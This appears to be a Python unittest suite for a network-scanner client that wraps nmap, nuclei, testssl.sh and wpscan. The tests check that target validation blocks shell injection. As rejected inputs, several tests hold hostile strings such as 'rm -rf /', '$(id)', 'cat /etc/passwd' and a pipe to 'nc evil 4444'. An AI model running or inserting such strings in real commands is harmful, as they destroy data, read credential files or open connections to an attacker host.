import json
import os
import signal
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from unittest import mock

from client import scope, tools

FIXTURES = os.path.join(os.path.dirname(__file__), '..', '..', 'cvengine_scanner', 'tests', 'fixtures')  # the library's samples: the parsers' tests use them too

# What host names resolve to in these tests: nothing here ever asks a real DNS server.
NAMES = {'www.example.test': ['93.184.215.14'], 'mail.example.test': ['93.184.215.20'],
         'dual.example.test': ['2606:4700::6810:1', '93.184.215.30', '93.184.215.31'], 'v6only.example.test': ['2606:4700::6810:2']}


def fake_getaddrinfo(name, port, *args, **kwargs):
    if name not in NAMES:
        raise OSError('no such host')
    return [(10 if ':' in a else 2, 1, 6, '', (a, 0)) for a in NAMES[name]]


def setUpModule():
    """No test here resolves a name for real, looks up this machine's own addresses, or depends on this machine's network setting."""
    for patcher in (mock.patch('socket.getaddrinfo', side_effect=fake_getaddrinfo),
                    mock.patch.object(scope, 'own_addresses', return_value=frozenset({'172.19.0.2'})),
                    mock.patch.object(scope, 'internal_allowed', return_value=False)):
        patcher.start()
        unittest.addModuleCleanup(patcher.stop)


FINISHED_REPORT = '<nmaprun><runstats><finished exit="success"/></runstats></nmaprun>'


def _read(name):
    with open(os.path.join(FIXTURES, name), encoding='utf-8') as handle:
        return handle.read()


class ValidateTargetsTests(unittest.TestCase):
    """The one gate every target list passes through before it ever reaches subprocess: a compromised or buggy server
    naming something other than a plain address, host name or host:port must never reach an argv list."""

    def test_accepts_plain_ips_and_hostnames(self):
        out = tools.validate_targets(['8.8.8.8', '2606:4700:4700::1111', 'www.example.test', 'WWW.Example.test.'])
        self.assertEqual(out, ['8.8.8.8', '2606:4700:4700::1111', 'www.example.test'])

    def test_host_port_and_urls_only_for_the_endpoint_form(self):
        values = ['https://www.example.test/admin', 'www.example.test:8443', '[2606:4700:4700::1111]:443', '8.8.8.8:0080', '1.1.1.1']
        self.assertEqual(tools.validate_targets(values, endpoint=True),
                         ['https://www.example.test/admin', 'www.example.test:8443', '[2606:4700:4700::1111]:443', '8.8.8.8:80', '1.1.1.1'])
        for value in values[:4]:
            with self.subTest(value=value), self.assertRaises(tools.TargetError):
                tools.validate_targets([value])

    def test_a_bad_port_or_scheme_is_refused_for_the_endpoint_form(self):
        for bad in ('www.example.test:0', 'www.example.test:65536', 'www.example.test:abc', 'www.example.test:', ':443', '[::1]:443',
                    '[2606:4700:4700::1111]:99999', 'ftp://8.8.8.8/', 'http://user:pw@www.example.test/', 'http://127.0.0.1/'):
            with self.subTest(bad=bad), self.assertRaises(tools.TargetError):
                tools.validate_targets([bad], endpoint=True)

    def test_rejects_shell_metacharacters(self):
        for bad in ('8.8.8.8; rm -rf /', '`whoami`', '$(id)', '8.8.8.8 && cat /etc/passwd', '8.8.8.8|nc evil 4444',
                    "8.8.8.8'", '8.8.8.8"', 'target\nwith\nnewlines', 'www.example.test\x00'):
            for endpoint in (False, True):
                with self.subTest(bad=bad, endpoint=endpoint), self.assertRaises(tools.TargetError):
                    tools.validate_targets([bad], endpoint=endpoint)

    def test_rejects_urls_and_schemes(self):
        for bad in ('http://8.8.8.8/', 'https://example.test/admin', 'file:///etc/passwd'):
            with self.assertRaises(tools.TargetError, msg=bad):
                tools.validate_targets([bad])

    def test_rejects_not_a_list_or_an_empty_list(self):
        for bad in (None, 'a-single-string', [], {}, 42):
            with self.assertRaises(tools.TargetError):
                tools.validate_targets(bad)

    def test_rejects_an_overlong_or_non_string_entry(self):
        with self.assertRaises(tools.TargetError):
            tools.validate_targets(['x' * 300])
        with self.assertRaises(tools.TargetError):
            tools.validate_targets([12345])
        with self.assertRaises(tools.TargetError):
            tools.validate_targets([None])

    def test_more_than_the_limit_is_refused_never_truncated(self):
        many = [f'8.8.{i // 256}.{i % 256}' for i in range(200)]
        with self.assertRaises(tools.TargetError):
            tools.validate_targets(many, limit=10)
        with self.assertRaises(tools.TargetError):
            tools.validate_targets(many[:tools.MAX_TARGETS + 1])
        self.assertEqual(len(tools.validate_targets(many[:tools.MAX_TARGETS])), tools.MAX_TARGETS)

    def test_a_bad_entry_after_the_first_ones_is_still_caught(self):
        with self.assertRaises(tools.TargetError):
            tools.validate_targets(['8.8.8.8'] * 9 + ['127.0.0.1'], limit=10)

    def test_duplicates_are_dropped_in_order(self):
        self.assertEqual(tools.validate_targets(['1.1.1.1', '8.8.8.8', '1.1.1.1', 'www.example.test', 'WWW.EXAMPLE.TEST']),
                         ['1.1.1.1', '8.8.8.8', 'www.example.test'])

    def test_a_name_that_does_not_resolve_is_allowed(self):
        self.assertEqual(tools.validate_targets(['nowhere.example.test']), ['nowhere.example.test'])


class RunnerArgvTests(unittest.TestCase):
    """The argv passed to subprocess is always a fixed list of flags plus the validated target list (never a string,
    never shell=True), and the target file is written, not interpolated into the command."""

    def test_run_nmap_builds_a_fixed_argv_and_parses_its_stdout(self):
        captured = {}

        def fake_run(argv, timeout, register=None):
            captured['argv'], captured['timeout'] = argv, timeout
            self.assertIsInstance(argv, list)
            with open(argv[argv.index('-iL') + 1], encoding='utf-8') as handle:
                captured['targets_file_contents'] = handle.read()
            return _read('sample_nmap.xml')
        with mock.patch('client.tools._run', side_effect=fake_run):
            result = tools.run_nmap(['8.8.8.8', '1.1.1.1'])
        self.assertEqual(captured['argv'][0], tools.NMAP_BIN)
        self.assertIn('-oX', captured['argv'])
        self.assertIn('-n', captured['argv'])  # no reverse DNS: parse_nmap_xml never reads host names
        self.assertEqual(captured['targets_file_contents'], '8.8.8.8\n1.1.1.1\n')
        self.assertEqual(captured['timeout'], tools.NMAP_MIN_TIMEOUT)
        # the sample report's two hosts, plus an empty row for each requested address the report does not mention
        self.assertEqual(len(result['hosts']), 4)
        self.assertEqual({h['ip'] for h in result['hosts']} >= {'8.8.8.8', '1.1.1.1'}, True)

    def test_nmap_and_naabu_are_given_the_address_a_name_was_judged_by(self):
        files = []

        def fake_run(argv, timeout, register=None):
            path = argv[argv.index('-iL') + 1] if '-iL' in argv else argv[argv.index('-list') + 1]
            with open(path, encoding='utf-8') as handle:
                files.append(handle.read())
            return FINISHED_REPORT
        with mock.patch('client.tools._run', side_effect=fake_run):
            tools.run_nmap(['www.example.test', 'dual.example.test', 'v6only.example.test', 'nowhere.example.test', '93.184.215.14'])
            tools.run_naabu(['www.example.test', 'dual.example.test'])
        # The first IPv4 address of each name (what nmap and naabu pick themselves); a name with none, or that does not resolve, is dropped.
        self.assertEqual(files, ['93.184.215.14\n93.184.215.30\n', '93.184.215.14\n93.184.215.30\n'])

    def test_nothing_runs_when_no_name_resolves(self):
        with mock.patch('client.tools._run') as fake_run:
            self.assertEqual(tools.run_nmap(['nowhere.example.test'])['hosts'], [])
            self.assertEqual(tools.run_naabu(['nowhere.example.test']), {'ports': {}})
        fake_run.assert_not_called()

    def test_nmap_that_did_not_finish_is_an_error_never_an_empty_result(self):
        for report in ('', 'not xml', '<other/>', '<nmaprun><host/></nmaprun>', '<nmaprun><runstats><finished exit="error"/></runstats></nmaprun>'):
            with self.subTest(report=report), mock.patch('client.tools._run', return_value=report):
                with self.assertRaises(tools.ToolOutputError):
                    tools.run_nmap(['8.8.8.8'])

    def test_every_requested_address_gets_a_host_row(self):
        with mock.patch('client.tools._run', return_value=FINISHED_REPORT):
            result = tools.run_nmap(['8.8.8.8', '1.1.1.1'])
        self.assertEqual(result['hosts'], [{'ip': '8.8.8.8', 'os_guess': '', 'ports': []}, {'ip': '1.1.1.1', 'os_guess': '', 'ports': []}])

    def test_os_is_reported_unreliable_only_inside_docker_desktop_style_kernels(self):
        for release, reliable in (('6.19.14+kali-amd64', True), ('6.10.14-linuxkit', False), ('5.15.153.1-microsoft-standard-WSL2', False),
                                  ('6.5.0-orbstack-00001', False), ('6.8.0-45-generic', True)):
            with self.subTest(release=release), mock.patch('client.tools.platform.release', return_value=release), \
                    mock.patch('client.tools._run', return_value=FINISHED_REPORT):
                self.assertIs(tools.run_nmap(['8.8.8.8'])['os_reliable'], reliable)

    def test_the_nmap_timeout_grows_with_the_host_count(self):
        self.assertEqual(tools.nmap_timeout(1), 600)
        self.assertEqual(tools.nmap_timeout(10), 900)
        self.assertEqual(tools.nmap_timeout(64), 3600)
        with mock.patch('client.tools._run', return_value=FINISHED_REPORT) as fake_run:
            tools.run_nmap([f'8.8.8.{i}' for i in range(1, 21)])
            self.assertEqual(fake_run.call_args[0][1], 1800)
            tools.run_nmap(['8.8.8.8'], timeout=42)
            self.assertEqual(fake_run.call_args[0][1], 42)

    def test_an_ipv6_address_runs_nmap_with_dash_6_on_its_own_and_the_hosts_come_back_together(self):
        runs = []

        def fake_run(argv, timeout, register=None):
            with open(argv[argv.index('-iL') + 1], encoding='utf-8') as handle:
                runs.append((argv, handle.read()))
            return _read('sample_nmap.xml') if len(runs) == 1 else FINISHED_REPORT
        with mock.patch('client.tools._run', side_effect=fake_run):
            result = tools.run_nmap(['8.8.8.8', '2606:4700:4700::1111'])
        self.assertEqual(len(runs), 2)
        self.assertNotIn('-6', runs[0][0])
        self.assertEqual(runs[0][1], '8.8.8.8\n')
        self.assertEqual(runs[1][0][:3], [tools.NMAP_BIN, '-6', *tools.NMAP_FLAGS[:1]])
        self.assertEqual(runs[1][1], '2606:4700:4700::1111\n')
        self.assertEqual(len(result['hosts']), 4)  # the sample report's two hosts, plus an empty row for each requested address it does not mention
        with mock.patch('client.tools._run', return_value=FINISHED_REPORT) as only_v6:
            tools.run_nmap(['2606:4700:4700::1111'])
        self.assertEqual(only_v6.call_count, 1)
        self.assertEqual(only_v6.call_args[0][0][1], '-6')

    def test_run_naabu_builds_a_fixed_argv_and_parses_its_stdout(self):
        with mock.patch('client.tools._run', return_value=_read('sample_naabu.jsonl')) as fake_run:
            result = tools.run_naabu(['8.8.8.8'])
        argv = fake_run.call_args[0][0]
        self.assertEqual(argv[0], tools.NAABU_BIN)
        self.assertIn('-json', argv)
        self.assertEqual(result['ports']['192.0.2.10'], [22, 80])  # whatever naabu printed is parsed as it is

    def test_run_nuclei_adds_clean_tags_and_severities_only(self):
        with mock.patch('client.tools._run', return_value=_read('sample_nuclei.jsonl')) as fake_run:
            result = tools.run_nuclei(['www.example.test'], tags=['tech', 'not valid; rm -rf /'],
                                      severities=['high', 'not-a-severity'])
        argv = fake_run.call_args[0][0]
        self.assertIn('-tags', argv)
        self.assertEqual(argv[argv.index('-tags') + 1], 'tech')  # the shell-unsafe tag was dropped, not passed through
        self.assertIn('-severity', argv)
        self.assertEqual(argv[argv.index('-severity') + 1], 'high')
        self.assertEqual(len(result['findings']), 2)

    def test_nuclei_always_excludes_dos_templates_and_omits_raw_traffic(self):
        for tags in (None, [], ['cve'], ['dos', 'cve']):
            with self.subTest(tags=tags), mock.patch('client.tools._run', return_value='') as fake_run:
                tools.run_nuclei(['www.example.test'], tags=tags)
                argv = fake_run.call_args[0][0]
                self.assertEqual(argv[argv.index('-etags') + 1], 'dos')
                self.assertIn('-omit-raw', argv)
                self.assertEqual('-tags' in argv, bool(tags))

    def test_a_tag_filter_with_nothing_usable_fails_closed(self):
        for tags in (['not valid; rm -rf /'], ['CVE'], ['cve\n'], 'cve', [42]):
            with self.subTest(tags=tags), mock.patch('client.tools._run') as fake_run:
                with self.assertRaises(tools.TargetError):
                    tools.run_nuclei(['www.example.test'], tags=tags)
                fake_run.assert_not_called()

    def test_a_trailing_newline_is_not_a_valid_tag_or_severity(self):
        self.assertEqual(tools._clean_words(['cve\n', 'rce'], tools._TAG), ['rce'])
        self.assertEqual(tools._clean_words(['high\n', 'low'], tools._SEVERITY), ['low'])
        self.assertEqual(tools._clean_words('high', tools._SEVERITY), [])

    def test_nuclei_keeps_names_and_takes_urls_and_host_port(self):
        with mock.patch('client.tools._run', return_value='') as fake_run:
            def capture(argv, timeout, register=None):
                with open(argv[argv.index('-l') + 1], encoding='utf-8') as handle:
                    capture.text = handle.read()
                return ''
            fake_run.side_effect = capture
            tools.run_nuclei(['https://www.example.test/', 'www.example.test:8443', '[2606:4700:4700::1111]:443'])
        self.assertEqual(capture.text, 'https://www.example.test/\nwww.example.test:8443\n[2606:4700:4700::1111]:443\n')

    def test_a_malicious_target_never_reaches_subprocess(self):
        with mock.patch('client.tools._run') as fake_run:
            with self.assertRaises(tools.TargetError):
                tools.run_nmap(['8.8.8.8; rm -rf /'])
        fake_run.assert_not_called()


class RunTests(unittest.TestCase):
    """``_run`` itself, with real (harmless) child processes: bounded output, the whole process group killed on timeout."""

    def test_returns_stdout_and_registers_a_handle_the_daemon_can_poll_and_kill(self):
        handles = []
        out = tools._run([sys.executable, '-c', 'print("hello")'], 30, register=handles.append)
        self.assertEqual(out, 'hello\n')
        self.assertEqual(len(handles), 1)
        self.assertEqual(handles[0].poll(), 0)
        self.assertTrue(callable(handles[0].kill))

    def test_output_past_the_cap_stops_the_run_with_a_clear_error(self):
        script = 'import sys, time; sys.stdout.write("x" * 100000); sys.stdout.flush(); time.sleep(30)'
        started = time.monotonic()
        with self.assertRaises(tools.ToolOutputError):
            tools._run([sys.executable, '-c', script], 30, max_bytes=1000)
        self.assertLess(time.monotonic() - started, 15)

    def test_the_default_cap_applies_to_nmap_xml_and_udp_raw_xml(self):
        with tempfile.TemporaryDirectory() as work:
            fake_nmap = os.path.join(work, 'nmap')
            with open(fake_nmap, 'w', encoding='utf-8') as handle:
                handle.write(f'#!{sys.executable}\nimport sys\nsys.stdout.write("<" * 5000)\n')
            os.chmod(fake_nmap, 0o755)
            with mock.patch.object(tools, 'NMAP_BIN', fake_nmap), mock.patch.object(tools, 'MAX_TOOL_OUTPUT', 1000):
                with self.assertRaises(tools.ToolOutputError):
                    tools.run_nmap_udp('8.8.8.8')
                with self.assertRaises(tools.ToolOutputError):
                    tools.run_nmap(['8.8.8.8'])

    def test_a_timeout_kills_the_whole_process_group_and_raises(self):
        with tempfile.TemporaryDirectory() as work:
            pid_file = os.path.join(work, 'child.pid')
            script = ('import subprocess, sys, time\n'
                      f'child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])\n'
                      f'open({pid_file!r}, "w").write(str(child.pid))\n'
                      'time.sleep(60)\n')
            with mock.patch('client.tools.os.killpg', wraps=os.killpg) as killpg:
                with self.assertRaises(subprocess.TimeoutExpired):
                    tools._run([sys.executable, '-c', script], 2)
            self.assertEqual(killpg.call_args[0][1], signal.SIGKILL)
            with open(pid_file, encoding='utf-8') as handle:
                grandchild = int(handle.read())
        self.assertTrue(_gone(grandchild), 'the tool\'s own child was left running')

    def test_the_handle_kills_the_group_and_falls_back_to_the_process(self):
        proc = mock.Mock(pid=4321)
        with mock.patch('client.tools.os.killpg') as killpg:
            tools._ProcessGroup(proc).kill()
        killpg.assert_called_once_with(4321, signal.SIGKILL)
        proc.kill.assert_not_called()
        with mock.patch('client.tools.os.killpg', side_effect=ProcessLookupError):
            tools._ProcessGroup(proc).kill()
        proc.kill.assert_called_once_with()

    def test_every_tool_starts_in_its_own_session(self):
        with mock.patch('client.tools.subprocess.Popen', side_effect=OSError('stop here')) as popen:
            with self.assertRaises(OSError):
                tools._run(['true'], 5)
        self.assertTrue(popen.call_args[1]['start_new_session'])


def _gone(pid, wait=5.0):
    """Whether ``pid`` has exited (a zombie waiting for its reaper counts as gone)."""
    deadline = time.monotonic() + wait
    while time.monotonic() < deadline:
        try:
            with open(f'/proc/{pid}/stat', encoding='utf-8') as handle:
                if handle.read().rsplit(')', 1)[1].split()[0] == 'Z':
                    return True
        except FileNotFoundError:
            return True
        time.sleep(0.05)
    return False


class TestsslRunnerTests(unittest.TestCase):
    """The argv passed to subprocess.Popen is always a fixed list of flags plus the server-vetted host:ip:port
    (never a string, never shell=True) and only the four fields evaluate() reads ever leave this process."""

    class _FakeProc:
        pid = 98765

        def __init__(self, argv, report, **kwargs):
            self.argv = argv
            self.kwargs = kwargs
            self.returncode = 0
            out = argv[argv.index('--jsonfile') + 1]
            with open(out, 'w', encoding='utf-8') as handle:
                json.dump(report, handle)

        def communicate(self, timeout=None):
            return ('', '')

    def test_an_oversized_or_unreadable_report_is_a_failed_run_not_no_findings(self):
        with mock.patch('client.tools.MAX_TESTSSL_OUTPUT', 10), \
                mock.patch('client.tools.subprocess.Popen', side_effect=lambda argv, **kw: self._FakeProc(argv, [{'id': 'x' * 50, 'severity': 'LOW'}], **kw)):
            with self.assertRaises(tools.ToolOutputError):
                tools.run_testssl('www.example.test', '8.8.8.8', 443)

        class NoReport(self._FakeProc):
            def __init__(self, argv, report, **kwargs):
                self.argv, self.kwargs = argv, kwargs  # writes no report file at all
        with mock.patch('client.tools.subprocess.Popen', side_effect=lambda argv, **kw: NoReport(argv, [], **kw)):
            with self.assertRaises(tools.ToolOutputError):
                tools.run_testssl('www.example.test', '8.8.8.8', 443)

    def test_builds_a_fixed_argv_and_reads_only_the_four_fields(self):
        report = [{'id': 'heartbleed', 'severity': 'HIGH', 'finding': 'VULNERABLE', 'cve': 'CVE-2014-0160', 'extra': 'dropped'},
                  {'id': 'not_tracked', 'severity': 'INFO', 'finding': 'test ok'}]
        captured = {}

        def fake_popen(argv, **kwargs):
            proc = self._FakeProc(argv, report, **kwargs)
            captured['argv'], captured['kwargs'] = proc.argv, kwargs
            return proc
        with mock.patch('client.tools.subprocess.Popen', side_effect=fake_popen):
            result = tools.run_testssl('www.example.test', '8.8.8.8', 443)
        self.assertEqual(captured['argv'][0], tools.TESTSSL_BIN)
        self.assertIn('--ip', captured['argv'])
        self.assertEqual(captured['argv'][-1], 'www.example.test:443')
        self.assertTrue(captured['kwargs']['start_new_session'])
        self.assertEqual(result, {'items': [
            {'id': 'heartbleed', 'severity': 'HIGH', 'finding': 'VULNERABLE', 'cve': 'CVE-2014-0160'},
            {'id': 'not_tracked', 'severity': 'INFO', 'finding': 'test ok', 'cve': ''}]})

    def test_starttls_is_added_only_when_given(self):
        captured = {}

        def fake_popen(argv, **kwargs):
            captured['argv'] = argv
            return self._FakeProc(argv, [])
        with mock.patch('client.tools.subprocess.Popen', side_effect=fake_popen):
            tools.run_testssl('mail.example.test', '8.8.4.4', 25, starttls='smtp')
        self.assertIn('--starttls', captured['argv'])
        self.assertEqual(captured['argv'][captured['argv'].index('--starttls') + 1], 'smtp')
        with mock.patch('client.tools.subprocess.Popen') as popen:
            for bad in ('smtp; id', 'SMTP\n', 7):
                with self.subTest(bad=bad), self.assertRaises(tools.TargetError):
                    tools.run_testssl('mail.example.test', '8.8.4.4', 25, starttls=bad)
        popen.assert_not_called()

    def test_an_ipv6_host_is_bracketed(self):
        captured = {}

        def fake_popen(argv, **kwargs):
            captured['argv'] = argv
            return self._FakeProc(argv, [])
        with mock.patch('client.tools.subprocess.Popen', side_effect=fake_popen):
            tools.run_testssl('2606:4700:4700::1111', '2606:4700:4700::1111', 443)
        self.assertEqual(captured['argv'][-1], '[2606:4700:4700::1111]:443')

    def test_a_malicious_host_never_reaches_subprocess(self):
        with mock.patch('client.tools.subprocess.Popen') as popen:
            with self.assertRaises(tools.TargetError):
                tools.run_testssl('host; rm -rf /', '8.8.8.8', 443)
            with self.assertRaises(tools.TargetError):
                tools.run_testssl('www.example.test', 'www.example.test', 443)  # the ip must be one plain address
        popen.assert_not_called()

    def test_a_timeout_kills_the_group_and_raises_instead_of_reporting_no_issues(self):
        class Slow(self._FakeProc):
            calls = 0

            def communicate(self, timeout=None):
                Slow.calls += 1
                if Slow.calls == 1:
                    raise subprocess.TimeoutExpired('testssl.sh', timeout)
                return ('', '')
        with mock.patch('client.tools.subprocess.Popen', side_effect=lambda argv, **kw: Slow(argv, [])), \
                mock.patch('client.tools.os.killpg') as killpg:
            with self.assertRaises(subprocess.TimeoutExpired):
                tools.run_testssl('www.example.test', '8.8.8.8', 443, timeout=1)
        killpg.assert_called_once_with(Slow.pid, signal.SIGKILL)


class UdpRunnerTests(unittest.TestCase):
    def test_builds_a_fixed_argv_with_the_curated_ports_and_returns_raw_xml(self):
        with mock.patch('client.tools._run', return_value='<nmaprun/>') as fake_run:
            result = tools.run_nmap_udp('8.8.8.8')
        argv = fake_run.call_args[0][0]
        self.assertEqual(argv[0], tools.NMAP_BIN)
        self.assertIn('-sU', argv)
        self.assertIn('8.8.8.8', argv)
        self.assertEqual(fake_run.call_args[0][1], 1500)
        self.assertEqual(result, {'xml': '<nmaprun/>'})

    def test_an_ipv6_address_is_scanned_with_dash_6(self):
        with mock.patch('client.tools._run', return_value='<nmaprun/>') as fake_run:
            tools.run_nmap_udp('2606:4700:20::681a:907')
        argv = fake_run.call_args[0][0]
        self.assertEqual(argv[:3], [tools.NMAP_BIN, '-6', '-sU'])
        with mock.patch('client.tools._run', return_value='<nmaprun/>') as v4:
            tools.run_nmap_udp('8.8.8.8')
        self.assertNotIn('-6', v4.call_args[0][0])

    def test_a_name_stays_a_name_in_the_raw_report(self):
        with mock.patch('client.tools._run', return_value='<nmaprun/>') as fake_run:
            tools.run_nmap_udp('www.example.test')
        self.assertEqual(fake_run.call_args[0][0][-1], 'www.example.test')

    def test_a_malicious_address_never_reaches_subprocess(self):
        with mock.patch('client.tools._run') as fake_run:
            with self.assertRaises(tools.TargetError):
                tools.run_nmap_udp('8.8.8.8; rm -rf /')
        fake_run.assert_not_called()


class WpscanRunnerTests(unittest.TestCase):
    class _FakeProc:
        pid = 55555

        def __init__(self, argv, env, report, returncode=0, stderr='', stdout=''):
            self.argv, self.env = argv, env
            self.returncode = returncode
            self._stderr = stderr
            self._stdout = stdout
            if report is not None:
                out = argv[argv.index('-o') + 1]
                with open(out, 'w', encoding='utf-8') as handle:
                    json.dump(report, handle)

        def communicate(self, timeout=None):
            return (self._stdout, self._stderr)

    def test_builds_argv_reads_the_report_and_puts_the_token_only_in_the_environment(self):
        report = {'version': {'number': '6.4'}}
        captured = {}

        def fake_popen(argv, env=None, **kwargs):
            proc = self._FakeProc(argv, env, report)
            captured['argv'], captured['env'], captured['kwargs'] = argv, env, kwargs
            return proc
        with mock.patch('client.tools.subprocess.Popen', side_effect=fake_popen):
            result = tools.run_wpscan('https://www.example.test', token='super-secret-token')
        self.assertEqual(captured['argv'][0], tools.WPSCAN_BIN)
        self.assertIn('--url', captured['argv'])
        self.assertNotIn('super-secret-token', captured['argv'])
        self.assertEqual(captured['env'].get('WPSCAN_API_TOKEN'), 'super-secret-token')
        self.assertTrue(captured['kwargs']['start_new_session'])
        self.assertEqual(result, {'report': report, 'returncode': 0, 'stderr_tail': ''})

    def test_no_report_written_is_reported_as_none_not_a_crash(self):
        def fake_popen(argv, env=None, **kwargs):
            return self._FakeProc(argv, env, None, returncode=4, stderr='Scan Aborted: not running WordPress\n')
        with mock.patch('client.tools.subprocess.Popen', side_effect=fake_popen):
            result = tools.run_wpscan('https://www.example.test')
        self.assertIsNone(result['report'])
        self.assertEqual(result['returncode'], 4)
        self.assertEqual(result['stderr_tail'], 'Scan Aborted: not running WordPress')

    def test_the_throttle_is_above_zero(self):
        # WPScan refuses --throttle 0 ("--throttle 0 is not > 0") and aborts before scanning
        self.assertGreater(int(tools.WPSCAN_ARGS[tools.WPSCAN_ARGS.index('--throttle') + 1]), 0)

    def _run_fake(self, token='', **fake):
        report = fake.pop('report', None)
        with mock.patch('client.tools.subprocess.Popen', side_effect=lambda argv, env=None, **kw: self._FakeProc(argv, env, report, **fake)):
            return tools.run_wpscan('https://www.example.test', token=token)

    def test_a_failure_wpscan_prints_on_stdout_is_reported_when_stderr_is_empty(self):
        result = self._run_fake(returncode=1, stdout='[i] starting\nScan Aborted: invalid option: --x\n')
        self.assertEqual(result['stderr_tail'], 'Scan Aborted: invalid option: --x')

    def test_stderr_wins_over_stdout(self):
        result = self._run_fake(returncode=1, stdout='Scan Aborted: from stdout\n', stderr='boom from stderr\n\n')
        self.assertEqual(result['stderr_tail'], 'boom from stderr')

    def test_a_vulnerable_exit_code_keeps_the_report_and_returncode(self):
        report = {'version': {'number': '6.4'}}
        result = self._run_fake(returncode=4, report=report, stdout='lots of output\n')
        self.assertEqual(result['report'], report)
        self.assertEqual(result['returncode'], 4)

    def test_the_token_and_long_lines_never_come_back(self):
        result = self._run_fake(token='tok-123', returncode=1, stdout='Scan Aborted: bad token tok-123 ' + 'x' * 500 + '\n')
        self.assertNotIn('tok-123', result['stderr_tail'])
        self.assertIn('***', result['stderr_tail'])
        self.assertLessEqual(len(result['stderr_tail']), 300)

    def test_a_timeout_kills_the_whole_group(self):
        class Slow(self._FakeProc):
            calls = 0

            def communicate(self, timeout=None):
                Slow.calls += 1
                if Slow.calls == 1:
                    raise subprocess.TimeoutExpired('wpscan', timeout)
                self.returncode = -9
                return ('', 'killed\n')
        with mock.patch('client.tools.subprocess.Popen', side_effect=lambda argv, env=None, **kw: Slow(argv, env, None)), \
                mock.patch('client.tools.os.killpg') as killpg:
            result = tools.run_wpscan('https://www.example.test', timeout=60)
        killpg.assert_called_once_with(Slow.pid, signal.SIGKILL)
        self.assertEqual(result['returncode'], -9)

    def test_rejects_a_non_url(self):
        with mock.patch('client.tools.subprocess.Popen') as popen:
            with self.assertRaises(tools.TargetError):
                tools.run_wpscan('not-a-url; rm -rf /')
        popen.assert_not_called()


class DetectToolsTests(unittest.TestCase):
    def test_a_missing_binary_is_left_out_not_fatal(self):
        with mock.patch('client.tools.subprocess.run', side_effect=FileNotFoundError), \
                mock.patch('client.tools.gvm_available', return_value=False):
            self.assertEqual(tools.detect_tools(), [])

    def test_an_installed_binary_is_reported(self):
        with mock.patch('client.tools.subprocess.run', return_value=mock.Mock(returncode=0)), \
                mock.patch('client.tools.gvm_available', return_value=False):
            self.assertEqual(sorted(tools.detect_tools()), ['naabu', 'nmap', 'nuclei', 'testssl', 'wafw00f', 'wpscan'])

    def test_gvm_is_reported_once_the_sentinels_own_gvmd_is_reachable(self):
        with mock.patch('client.tools.subprocess.run', side_effect=FileNotFoundError), \
                mock.patch('client.tools.gvm_available', return_value=True):
            self.assertEqual(tools.detect_tools(), ['gvm'])


class GvmAvailableTests(unittest.TestCase):
    def test_false_without_the_python_gvm_package(self):
        with mock.patch.dict('sys.modules', {'gvm': None}):
            self.assertFalse(tools.gvm_available())

    def test_false_when_the_socket_does_not_exist_yet(self):
        with mock.patch('client.openvas.socket_path', return_value='/no/such/socket'):
            self.assertFalse(tools.gvm_available())

    def test_true_once_the_package_imports_and_the_socket_exists(self):
        with tempfile.NamedTemporaryFile() as sock_file:
            with mock.patch('client.openvas.socket_path', return_value=sock_file.name):
                self.assertTrue(tools.gvm_available())


DISCOVER_XML = _read('sample_discover.xml')


class DiscoverTests(unittest.TestCase):
    def setUp(self):
        patcher = mock.patch('client.config._local_internal', return_value=True)
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_the_run_is_a_fixed_ping_sweep_of_the_validated_chunk(self):
        with mock.patch('client.tools._run', return_value=DISCOVER_XML) as fake_run:
            out = tools.run_discover('10.20.0.0/24')
        argv = fake_run.call_args[0][0]
        self.assertEqual(argv[0], tools.NMAP_BIN)
        self.assertIn('-sn', argv)
        self.assertNotIn('-sV', argv)
        self.assertEqual(argv[-1], '10.20.0.0/24')
        self.assertEqual(len(out['hosts']), 2)

    def test_a_public_ipv6_oversized_or_malformed_target_is_refused_without_running_anything(self):
        for bad in ('8.8.8.0/24', '10.0.0.0/8', 'fd00::/112', '10.20.0.5; rm -rf /', '10.20.0.7/24', '', None, '10.20.0.0/24 10.21.0.0/24'):
            with self.subTest(bad=bad), mock.patch('client.tools._run') as fake_run:
                with self.assertRaises(tools.TargetError):
                    tools.run_discover(bad)
                fake_run.assert_not_called()
        self.assertEqual(tools.validate_cidr(' 192.168.4.0/24 '), '192.168.4.0/24')
        self.assertEqual(tools.validate_cidr('100.64.1.0/25'), '100.64.1.0/25')

    def test_an_external_sentinel_never_sweeps_whatever_the_server_set(self):
        with mock.patch('client.config._local_internal', return_value=False), mock.patch('client.config._overrides', {'network': 'internal'}), \
                mock.patch('client.tools._run') as fake_run:
            with self.assertRaisesRegex(tools.TargetError, 'internal Sentinel'):
                tools.run_discover('10.20.0.0/24')
        fake_run.assert_not_called()


class GvmStatusTests(unittest.TestCase):
    def setUp(self):
        tools._GVM_STATUS.update(at=None, value=(False, 'not checked yet'))
        self.addCleanup(tools._GVM_STATUS.update, at=None, value=(False, 'not checked yet'))
        patcher = mock.patch('client.tools.gvm_available', return_value=True)
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_not_available_is_not_ready_without_asking_gvmd(self):
        with mock.patch('client.tools.gvm_available', return_value=False), mock.patch('client.openvas.readiness') as readiness:
            ready, why = tools.gvm_status()
        self.assertFalse(ready)
        self.assertIn('not running', why)
        readiness.assert_not_called()

    def test_the_first_check_happens_even_right_after_boot(self):
        with mock.patch('client.openvas.readiness', return_value=(True, '')) as readiness:
            self.assertEqual(tools.gvm_status(now=5), (True, ''))
        readiness.assert_called_once_with()

    def test_readiness_is_asked_once_a_minute_while_not_ready_and_the_reason_is_kept(self):
        with mock.patch('client.openvas.readiness', return_value=(False, 'GVM is still syncing its SCAP feed(s)')) as readiness:
            self.assertEqual(tools.gvm_status(now=100), (False, 'GVM is still syncing its SCAP feed(s)'))
            self.assertEqual(tools.gvm_status(now=130), (False, 'GVM is still syncing its SCAP feed(s)'))
            self.assertEqual(readiness.call_count, 1)
            readiness.return_value = (True, '')
            self.assertEqual(tools.gvm_status(now=100 + tools.GVM_STATUS_TTL + 1), (True, ''))
            self.assertTrue(tools.gvm_ready())

    def test_a_ready_answer_is_kept_longer(self):
        with mock.patch('client.openvas.readiness', return_value=(True, '')) as readiness:
            tools.gvm_status(now=1000)
            tools.gvm_status(now=1000 + tools.GVM_STATUS_TTL + 1)
            self.assertEqual(readiness.call_count, 1)
            tools.gvm_status(now=1000 + tools.GVM_READY_TTL + 1)
            self.assertEqual(readiness.call_count, 2)

